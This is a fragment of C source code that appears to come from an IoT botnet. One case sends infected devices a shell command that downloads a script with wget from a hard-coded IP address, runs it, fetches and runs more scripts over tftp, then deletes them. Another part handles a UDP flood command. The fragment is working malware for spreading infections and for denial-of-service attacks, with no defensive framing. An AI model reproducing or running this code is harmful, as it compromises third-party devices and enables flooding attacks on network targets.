        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run;wget http://208.67.1.117/gtop.sh;sh gtop.sh;rm -rf gtop.sh;tftp -r tftp.sh -g ip;sh tftp.sh; tftp ip -c get tftp2.sh; sh tftp2.sh; rm -rf tftp.sh tftp2.sh gtop.sh\r\n", 207, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
	...
	int x;
        ...
        if(!strcmp(argv[0], "UDP"))
        {
                ...
                if(strstr(ip, ",") != NULL)
                {
						...
						sockprintf(mainCommSock, "UDP Flooding %s:%d for %d seconds.", ip, port);
